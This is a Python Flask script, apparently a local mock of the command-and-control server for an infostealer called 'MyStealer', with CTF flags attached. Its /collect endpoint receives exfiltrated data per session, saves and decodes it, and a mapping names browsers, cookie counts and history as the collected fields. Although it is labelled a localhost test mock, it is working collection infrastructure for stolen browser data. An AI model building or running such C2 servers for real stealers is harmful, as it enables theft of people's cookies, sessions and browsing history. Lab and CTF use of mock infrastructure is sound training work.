#!/usr/bin/env python3
"""
C2 Server Local Test - Versão simplificada para testes sem Docker
"""

import os
import json
import base64
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

DATA_DIR = Path("/tmp/c2_data")
DATA_DIR.mkdir(parents=True, exist_ok=True)

CTF_FLAGS = {
    "health_check": f"CTF{{c2_mock_healthy_{datetime.now().strftime('%Y%m%d')}}}",
    "session_received": "CTF{data_exfiltrated_successfully}",
}

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat(),
        "service": "mystealer-c2-mock",
        "version": "0.3.1",
        "flag": CTF_FLAGS["health_check"]
    })

@app.route('/collect', methods=['POST'])
def collect_data():
    try:
        session_id = request.headers.get('X-Session-ID', 'unknown')
        raw_data = request.get_data()
        
        print(f"[+] Dados recebidos! Session: {session_id}, Size: {len(raw_data)} bytes")
        
        # Salvar dados
        session_dir = DATA_DIR / session_id
        session_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        filepath = session_dir / f"data_{timestamp}.bin"
        
        with open(filepath, 'wb') as f:
            f.write(raw_data)
        
        print(f"[+] Salvou em: {filepath}")
        
        # Análise básica
        try:
            decoded = base64.b64decode(raw_data)
            print(f"[+] Base64 decoded: {len(decoded)} bytes")
            print(f"[+] Preview (hex): {decoded[:50].hex()}")
        except Exception as e:
            print(f"[-] Erro ao decodificar: {e}")
        
        return jsonify({
            "status": "received",
            "session_id": session_id,
            "size": len(raw_data),
            "flag": CTF_FLAGS["session_received"]
        }), 200
        
    except Exception as e:
        print(f"[-] Erro: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/sessions', methods=['GET'])
def list_sessions():
    sessions = []
    if DATA_DIR.exists():
        for d in DATA_DIR.iterdir():
            if d.is_dir():
                files = list(d.glob("*"))
                sessions.append({
                    "session_id": d.name,
                    "files": len(files),
                    "total_size": sum(f.stat().st_size for f in files if f.is_file())
                })
    return jsonify({"total_sessions": len(sessions), "sessions": sessions})

@app.route('/serde-mapping', methods=['GET'])
def serde_mapping():
    return jsonify({
        "t": "timestamp", "s": "session_id", "m": "modules",
        "b": "browsers_found", "c": "total_cookies", "h": "total_history"
    })

@app.route('/', methods=['GET'])
def index():
    return "<h1>MyStealer C2 Mock - Local Test</h1><a href='/health'>Health</a> | <a href='/sessions'>Sessions</a>"

if __name__ == '__main__':
    print("=" * 50)
    print("  MyStealer C2 Local Test Server")
    print("=" * 50)
    print(f"Data dir: {DATA_DIR}")
    print("Starting on http://localhost:8080")
    print("")
    app.run(host='127.0.0.1', port=8080, debug=False)
